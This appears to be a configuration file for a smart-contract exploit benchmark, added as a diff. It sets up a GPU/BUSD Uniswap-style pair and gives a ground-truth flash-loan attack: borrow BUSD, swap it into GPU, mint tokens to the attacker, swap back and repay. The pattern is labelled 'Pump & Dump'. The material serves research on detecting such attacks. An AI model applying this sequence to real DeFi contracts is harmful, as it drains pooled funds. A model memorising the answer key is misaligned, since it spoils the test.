@@ -1,0 +1,73 @@
+# Information for benchmarks building
+project_name: "GPU"
+
+ctrt_name2cls:
+  - ["busd", "BUSD"]
+  # - ["wbnb", "WBNB"]
+  - ["gpu", "GPU"]
+  # - ["busdWbnbPair", "UniswapV2Pair"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["busd", ""]
+  # - ["wbnb", ""]
+  - ["gpu", "new GPU(address(this), address(busd))"]
+  # - ["busdWbnbPair", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+- 'function mint_gpu_attacker(uint256 amount) internal eurus {
+  gpu.transfer(address(attacker), amount);
+}'
+
+extra_deployments:
+  - "vm.warp(10**24 + 18 * 30 * 86400);
+  gpu.afterDeploy(address(router), address(pair));"
+
+extra_statements: []
+
+attack_goal_str: "busd"
+
+groundtruth:
+  - ["borrow", "busd", "owner", "22_600 ether"]
+  - ["swap", "pair", "attacker", "busd", "gpu", "22_600 ether", "pair.getAmountOut(22_400 ether, address(busd))"]
+  - ["mint", "gpu", "attacker", "gpu.balanceOf(address(attacker))"]
+  - ["swap", "pair", "attacker", "gpu", "busd", "gpu.balanceOf(address(attacker))", "pair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) * 9 /10"]
+  - ["payback", "busd", "owner", "(22_600 ether * 1003) / 1000"]
+  
+# Information for search space building.
+roles:
+  # "wbnb":
+  #   is_asset: true
+  #   is_erc20: true
+  #   is_stablecoin: true
+  "busd":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "gpu":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  # "busdWbnbPair":
+  #   is_swappair: true
+  #   is_uniswap: true
+  #   token_pair: ["busd", "wbnb"]
+  #   support_swaps:
+  #     "busd": ["busd", "wbnb"]
+  #     "wbnb": ["busd", "wbnb"]
+  #   is_lendpool: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["busd", "gpu"]
+    support_swaps:
+      "busd": ["busd", "gpu"]
+      "gpu": ["busd", "gpu"]
+    is_lendpool: true
+
+pattern: "Pump & Dump"
